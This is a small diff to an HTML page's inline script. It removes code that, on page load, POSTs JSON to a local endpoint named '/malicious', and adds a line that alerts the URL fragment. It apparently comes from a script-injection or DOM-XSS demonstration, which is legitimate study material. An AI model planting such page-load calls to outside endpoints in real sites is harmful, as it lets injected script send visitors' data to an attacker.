@@ -9,34 +9,8 @@
 <p >This is a paragraph.</p>
 <script>
 	
-	alert('Hello with update')
-	
-// Example POST method implementation:
-async function postData(url = '', data = {}) {
-  // Default options are marked with *
-  const response = await fetch(url, {
-    method: 'POST', 
-    mode: 'cors',
-    cache: 'no-cache', 
-    credentials: 'same-origin', 
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    redirect: 'follow', 
-    referrerPolicy: 'no-referrer', 
-    body: JSON.stringify(data) 
-  });
-  return response.json(); 
-}
-
-postData('http://localhost:3000/malicious', {
-"url": "https://fromwebpage.com",
-    "functions": "webfunction",
-    "count": "21"
-    })
-  .then(data => {
-    console.log(data); // JSON data parsed by `data.json()` call
-  });    
+	var x = location.hash;
+      alert(x);
 
 
 	
